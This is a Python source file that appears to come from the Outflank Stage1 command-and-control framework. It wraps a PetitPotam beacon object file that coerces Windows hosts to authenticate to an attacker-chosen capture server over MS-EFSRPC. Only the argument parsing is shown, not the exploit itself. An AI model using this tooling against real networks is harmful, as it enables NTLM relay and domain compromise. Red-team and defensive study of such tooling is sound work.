from typing import List, Tuple

from outflank_stage1.implant import ImplantArch
from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding


class PetitPotamBOF(BaseBOFTask):
    def __init__(self):
        super().__init__("PetitPotam")

        self.parser.description = (
            "Coerce Windows hosts to authenticate to other machines via MS-EFSRPC."
        )
        self.parser.epilog = "Example usage:\n  - PetitPotam [capture server ip or hostname] [target server ip or hostname]"

        self.parser.add_argument(
            "captureserver", help="Can be an IP address or hostname."
        )
        self.parser.add_argument("target", help="Can be a IP address or hostname.")

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        parser_arguments = self.parser.parse_args(arguments)

        return [
            (BOFArgumentEncoding.WSTR, parser_arguments.captureserver),
            (BOFArgumentEncoding.WSTR, parser_arguments.target),
        ]
